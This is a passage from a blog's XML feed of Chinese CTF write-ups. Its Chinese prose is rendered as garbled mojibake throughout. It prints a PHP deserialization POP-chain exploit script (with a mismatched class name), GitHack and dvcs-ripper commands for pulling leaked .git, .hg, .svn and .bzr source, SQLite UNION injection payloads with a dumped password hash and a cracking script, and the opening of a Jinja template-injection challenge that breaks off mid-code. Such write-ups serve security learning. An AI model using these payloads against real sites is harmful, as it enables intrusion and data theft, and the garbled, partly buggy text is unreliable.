<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ ¹æ®Y1ingå¸ˆå‚…çš„wpï¼ˆé™„ä¸Šé“¾æ¥ï¼šhttps:<span class="comment">//www.gem-love.com/ctf/2184.html#Ezpopï¼‰</span></span><br><span class="line"><span class="number">1.</span>__wakeup()æ–¹æ³•é€šè¿‡preg_match()å°†<span class="keyword">$this</span>-&gt;sourceåšå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå¦‚æœ<span class="keyword">$this</span>-&gt;sourceæ˜¯Showç±»ï¼Œå°±è°ƒç”¨äº†__toString()æ–¹æ³•ï¼›</span><br><span class="line"><span class="number">2.</span>__toString()è®¿é—®äº†strçš„sourceå±æ€§ï¼Œstræ˜¯Testç±»ï¼Œä¸å­˜åœ¨sourceå±æ€§ï¼Œå°±è°ƒç”¨äº†Testç±»çš„__get()é­”æœ¯æ–¹æ³•ï¼›</span><br><span class="line"><span class="number">3.</span>__get()æ–¹æ³•å°†pä½œä¸ºå‡½æ•°ä½¿ç”¨ï¼Œpå®ä¾‹åŒ–ä¸ºModifyç±»ï¼Œå°±è°ƒç”¨äº†Modifierçš„__invoke()æ–¹æ³•ï¼›</span><br><span class="line"><span class="number">4.</span>__invoke()è°ƒç”¨äº†append()æ–¹æ³•ï¼ŒåŒ…å«$valueï¼Œè‹¥å°†$valueä¸ºä¼ªåè®®ï¼Œåˆ™å¯è¯»flag.phpæºç </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $var;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source;</span><br><span class="line"><span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line">$r = <span class="keyword">new</span> Modifer();</span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$t-&gt;p=$r;</span><br><span class="line">$s-&gt;str=$t;</span><br><span class="line">$s-&gt;source=$s;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($s));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;MR&quot;&gt;&lt;a href=&quot;#MR&quot; class=&quot;headerlink&quot; title=&quot;MR&quot;&gt;&lt;/a&gt;MR&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="BJD2&amp;MRCTF" scheme="http://yoursite.com/tags/BJD2-MRCTF/"/>
    
  </entry>
  
  <entry>
    <title>ä¿¡æ¯æ³„éœ²</title>
    <link href="http://yoursite.com/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <id>http://yoursite.com/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</id>
    <published>2020-03-14T03:37:03.000Z</published>
    <updated>2020-03-14T13:29:08.292Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01ï¼š-hgæºç æ³„æ¼"><a href="#0x01ï¼š-hgæºç æ³„æ¼" class="headerlink" title="0x01ï¼š.hgæºç æ³„æ¼ "></a><strong>0x01ï¼š.hgæºç æ³„æ¼</strong> <a id="more"></a></h4><p>æ¼æ´æˆå› ï¼šhg init çš„æ—¶å€™ä¼šç”Ÿæˆ.hg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g.http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure><p>æ¼æ´åˆ©ç”¨:dvcs-ripper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip -hg.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure><h4 id="0x02-gitæºç æ³„æ¼"><a href="#0x02-gitæºç æ³„æ¼" class="headerlink" title="0x02: .gitæºç æ³„æ¼"></a>0x02: .gitæºç æ³„æ¼</h4><p>æ¼æ´æˆå› ï¼šåœ¨è¿è¡Œgit initåˆå§‹åŒ–ä»£ç åº“çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹é¢äº§ç”Ÿä¸€ä¸ª.gitçš„éšè—æ–‡ä»¶ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ç­‰ã€‚åœ¨å‘å¸ƒä»£ç çš„æ—¶å€™ï¼ŒæŠŠ.gitè¿™ä¸ªç›®å½•æ²¡æœ‰åˆ é™¤ï¼Œç›´æ¥å‘å¸ƒäº†ã€‚ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æºä»£ç ã€‚</p><p>æ¼æ´åˆ©ç”¨:GitHack</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><h4 id="0x03-DS-Storeæ–‡ä»¶æ³„æ¼"><a href="#0x03-DS-Storeæ–‡ä»¶æ³„æ¼" class="headerlink" title="0x03:  .DS_Storeæ–‡ä»¶æ³„æ¼"></a>0x03:  .DS_Storeæ–‡ä»¶æ³„æ¼</h4><p>æ¼æ´æˆå› :åœ¨å‘å¸ƒä»£ç æ—¶æœªåˆ é™¤æ–‡ä»¶å¤¹ä¸­éšè—çš„.DS_store,è¢«å‘ç°åï¼Œè·å–æ•æ„Ÿä¿¡æ¯.</p><p>æ¼æ´åˆ©ç”¨:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store</span><br></pre></td></tr></table></figure><p>å·¥å…·:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dsstoreexp</span><br><span class="line">python ds_store_exp.py http:&#x2F;&#x2F;www.example.com&#x2F;.DS_Store</span><br></pre></td></tr></table></figure><h4 id="0x04-ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶"><a href="#0x04-ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶" class="headerlink" title="0x04:ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶"></a>0x04:ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶</h4><p>å½“å¤‡ä»½æ–‡ä»¶æˆ–è€…ä¿®æ”¹è¿‡ç¨‹ä¸­çš„ç¼“å­˜æ–‡ä»¶å› ä¸ºå„ç§åŸå› è€Œè¢«ç•™åœ¨ç½‘ç«™webç›®å½•ä¸‹ï¼Œè€Œè¯¥ç›®å½•åˆæ²¡æœ‰è®¾ç½®è®¿é—®æƒé™æ—¶ï¼Œä¾¿æœ‰å¯èƒ½å¯¼è‡´å¤‡ä»½æ–‡ä»¶æˆ–è€…ç¼–è¾‘å™¨çš„ç¼“å­˜æ–‡ä»¶è¢«ä¸‹è½½ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œç»™æœåŠ¡å™¨çš„å®‰å…¨åŸ‹ä¸‹éšæ‚£ã€‚</p><p>æ¼æ´æˆå› ï¼š</p><ul><li>æœåŠ¡å™¨ç®¡ç†å‘˜é”™è¯¯åœ°å°†ç½‘ç«™æˆ–è€…ç½‘é¡µçš„å¤‡ä»½æ–‡ä»¶æ”¾ç½®åˆ°æœåŠ¡å™¨webç›®å½•ä¸‹ã€‚</li><li>ç¼–è¾‘å™¨åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­è‡ªåŠ¨ä¿å­˜çš„å¤‡ä»½æ–‡ä»¶æˆ–è€…ä¸´æ—¶æ–‡ä»¶å› ä¸ºå„ç§åŸå› æ²¡æœ‰è¢«åˆ é™¤è€Œä¿å­˜åœ¨webç›®å½•ä¸‹ã€‚</li></ul><p>æ¼æ´æµ‹è¯•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.swp</span><br><span class="line">.txt</span><br><span class="line">.html</span><br></pre></td></tr></table></figure><h4 id="0x05-SVNæ–‡ä»¶æ³„æ¼"><a href="#0x05-SVNæ–‡ä»¶æ³„æ¼" class="headerlink" title="0x05:SVNæ–‡ä»¶æ³„æ¼"></a>0x05:SVNæ–‡ä»¶æ³„æ¼</h4><p>æ¼æ´åˆ©ç”¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-svn.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure><h4 id="0x06ï¼šWEB-INF-web-xmlæ³„æ¼"><a href="#0x06ï¼šWEB-INF-web-xmlæ³„æ¼" class="headerlink" title="0x06ï¼šWEB-INF/web.xmlæ³„æ¼"></a>0x06ï¼šWEB-INF/web.xmlæ³„æ¼</h4><p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p><p>WEB-INFä¸»è¦æ–‡ä»¶æˆ–ç›®å½•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>æ¼æ´åˆ©ç”¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚</span><br></pre></td></tr></table></figure><p>0x07ï¼šCVSæ³„æ¼</p><p>æ¼æ´åˆ©ç”¨:</p><p>å–å›æºç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http:&#x2F;&#x2F;url&#x2F;name dir&#x2F;&#x2F;è¿™ä¸ªå‘½ä»¤çš„æ„æ€å°±æ˜¯æŠŠè¿œç«¯ä¸€ä¸ªåä¸ºnameçš„repo cloneåˆ°æœ¬åœ°åä¸ºdirçš„ç›®å½•ä¸‹ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bk changes</span><br><span class="line">Bazaar&#x2F;bzr</span><br><span class="line">&#x2F;&#x2F;æŸ¥çœ‹æ‰€æœ‰çš„æ”¹å˜çš„å‘½ä»¤ï¼Œè½¬åˆ°downloadçš„ç›®å½•</span><br></pre></td></tr></table></figure><p>å·¥å…·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x01ï¼š-hgæºç æ³„æ¼&quot;&gt;&lt;a href=&quot;#0x01ï¼š-hgæºç æ³„æ¼&quot; class=&quot;headerlink&quot; title=&quot;0x01ï¼š.hgæºç æ³„æ¼ &quot;&gt;&lt;/a&gt;&lt;strong&gt;0x01ï¼š.hgæºç æ³„æ¼&lt;/strong&gt;
    
    </summary>
    
    
    
      <category term="æ•æ„Ÿä¿¡æ¯" scheme="http://yoursite.com/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/"/>
    
  </entry>
  
  <entry>
    <title>æ”»é˜²daliy</title>
    <link href="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/"/>
    <id>http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/</id>
    <published>2020-03-11T10:22:54.000Z</published>
    <updated>2020-03-19T14:34:44.325Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0X01-FlatScience-20-03-11"><a href="#0X01-FlatScience-20-03-11" class="headerlink" title="0X01: FlatScience 20-03-11"></a>0X01: FlatScience 20-03-11<a id="more"></a></h4><p>æ‹¿åˆ°ç½‘é¡µï¼Œæ­£å¸¸æ“ä½œscanæ‰«ä¸€å‘</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/1.png" class="" title="examplename"><p>è®¿é—®login.phpé¡µé¢ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œæœ‰æç¤º</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- <span class="doctag">TODO:</span> Remove ?debug-Parameter! --&gt;</span></span><br></pre></td></tr></table></figure><p>é‡æ–°è®¿é—®login.php?debug,æ‹¿åˆ°äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="string">'usr'</span>];</span><br><span class="line">        $pass = $_POST[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>);</span><br><span class="line">        </span><br><span class="line">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>);</span><br><span class="line">    <span class="keyword">if</span>($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>);</span><br><span class="line">            header(<span class="string">"Location: /"</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span><br><span class="line">highlight_file(<span class="string">'login.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯SQLite3ï¼ŒæŸ¥æ‰¾èµ„æ–™çŸ¥é“sqliteè‡ªå¸¦çš„ç»“æ„è¡¨sqlite_masterï¼Œsqlæ˜¯sqlite_masterä¸­çš„ä¸€ä¸ªå­—æ®µï¼Œæ³¨å…¥æ—¶ç»å¸¸ç”¨åˆ°çš„</p><p>ä¸‹é¢å°±æ˜¯ç”¨sqlè¿›è¡Œå¯¹æ•°æ®åº“çš„æŸ¥è¯¢</p><p><code>usr=1&#39; union select name,sql from sqlite_master--+&amp;pw=</code></p><p>å¯ä»¥å¾—åˆ°set-cookie:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">Users</span>(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">hint <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±æ˜¯åˆ†åˆ«æŸ¥è¯¢ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`usr=1' union <span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">Users</span><span class="comment">--+&amp;pw=`  ----name=+admin</span></span><br><span class="line"><span class="string">`usr=1' union select id,password from Users--+&amp;pw=`</span> <span class="comment">----name=+3fab54a50e770d830c0416df817567662a9dc85c;</span></span><br><span class="line"><span class="string">`usr=1' union select id,hint from Users--+&amp;pw=`</span><span class="comment">----name=+my+fav+word+in+my+fav+paper%3F%21;</span></span><br></pre></td></tr></table></figure><p>ç»“åˆä¸Šé¢çš„æºç ä»¥åŠç»™å‡ºçš„hintï¼Œpassword=str(unknown).â€Salz!â€,åº”è¯¥è¦ç”¨å·²çŸ¥çš„å¯†ç åœ¨é¢˜ç›®ç»™å‡ºçš„æ–‡æ¡£ä¸­æ‰¾å‡ºåŠ å¯†åç›¸åŒçš„é‚£æ®µå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¿›è¡Œç¢°æ’ï¼Œä¸‹é¢ç»™å‡ºå¤§ä½¬çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">'utf-8'</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, set()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">pdf_path = get_pdf()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Searching word in "</span> + i</span><br><span class="line">pdf_text = convert_pdf_2_text(i).split(<span class="string">" "</span>)</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">sha1_password = hashlib.sha1(word+<span class="string">"Salz!"</span>).hexdigest()</span><br><span class="line"><span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Find the password :"</span> + word</span><br><span class="line">exit()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">find_password()</span><br></pre></td></tr></table></figure><p>è·‘å‡ºçš„å¯†ç ä¸ºThinJerboaï¼Œåœ¨admin.phpé¡µé¢ç™»å½•å°±å¯ä»¥æ‹¿åˆ°flag</p><p>ï¼ˆè¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯è¿™æ®µå¯†ç åˆšå¥½å¯ä»¥è¿›è¡Œmd5è§£å¯†ï¼Œå»æ‰é¢˜ç›®ç»™å‡ºçš„é‚£éƒ¨åˆ†åˆšå¥½æ˜¯ThinJerboaï¼‰</p><h4 id="0X02-shrine-20-03-12"><a href="#0X02-shrine-20-03-12" class="headerlink" title="0X02:shrine 20-03-12"></a>0X02:shrine 20-03-12</h4><p>æ‰“å¼€ç½‘é¡µï¼Œæ•´ç†ä¸€ä¸‹ç»™å‡ºçš„pythonä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span 